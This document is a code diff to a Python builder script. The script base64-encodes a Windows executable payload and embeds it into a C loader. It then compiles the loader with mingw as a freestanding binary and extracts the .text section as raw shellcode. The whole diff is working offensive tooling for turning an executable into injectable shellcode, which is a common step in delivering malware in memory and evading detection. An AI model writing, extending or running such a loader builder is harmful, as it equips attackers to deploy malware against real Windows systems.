@@ -1,37 +1,54 @@
 import base64
 import sys
 import os
+import subprocess
 
-def build(payload_path, loader_source):
-    if not os.path.exists(payload_path):
-        print(f"Error: Payload {payload_path} not found.")
-        sys.exit(1)
-
+def build(payload_path, loader_c, output_bin):
+    # 1. Encode payload
     with open(payload_path, "rb") as f:
         encoded_payload = base64.b64encode(f.read()).decode()
 
-    if not os.path.exists(loader_source):
-        print(f"Error: Loader source {loader_source} not found.")
+    # 2. Update loader.c with the payload
+    # We use a wrapper to ensure it stays in .text and is searchable
+    full_payload_str = f"---PAYLOAD:{encoded_payload}---"
+
+    with open(loader_c, "r") as f:
+        c_content = f.read()
+
+    placeholder = 'const char payload_b64[] = "---PAYLOAD_PLACEHOLDER---";'
+    if placeholder not in c_content:
+        print("Error: Could not find placeholder in loader.c")
         sys.exit(1)
 
-    with open(loader_source, "r") as f:
-        content = f.readlines()
+    new_c_content = c_content.replace(placeholder, f'const char payload_b64[] = "{full_payload_str}";')
 
-    new_content = []
-    for line in content:
-        if line.startswith('const char* payload_b64 = '):
-            new_content.append(f'const char* payload_b64 = "{encoded_payload}";\n')
-        else:
-            new_content.append(line)
+    with open("loader_final.c", "w") as f:
+        f.write(new_c_content)
 
-    with open(loader_source, "w") as f:
-        f.writelines(new_content)
+    # 3. Compile loader
+    loader_exe = "loader_temp.exe"
+    compile_cmd = [
+        "x86_64-w64-mingw32-gcc", "loader_final.c", "-o", loader_exe,
+        "-nostdlib", "-e", "LoaderEntry", "-ffreestanding",
+        "-fno-stack-protector", "-fno-common", "-fno-asynchronous-unwind-tables",
+        "-Os", "-s"
+    ]
+    print("Compiling loader...")
+    subprocess.run(compile_cmd, check=True)
 
-    print(f"Successfully embedded {payload_path} into {loader_source}")
+    # 4. Extract shellcode
+    print("Extracting shellcode...")
+    extract_cmd = ["x86_64-w64-mingw32-objcopy", "-O", "binary", "--only-section=.text", loader_exe, output_bin]
+    subprocess.run(extract_cmd, check=True)
+
+    # Cleanup
+    os.remove(loader_exe)
+    os.remove("loader_final.c")
+
+    print(f"Successfully created final shellcode: {output_bin} ({os.path.getsize(output_bin)} bytes)")
 
 if __name__ == "__main__":
-    if len(sys.argv) < 3:
-        print("Usage: python3 builder.py <payload.exe> <loader.c>")
+    if len(sys.argv) < 4:
+        print("Usage: python3 builder.py <payload.exe> <loader.c> <output.bin>")
         sys.exit(1)
-
-    build(sys.argv[1], sys.argv[2])
+    build(sys.argv[1], sys.argv[2], sys.argv[3])
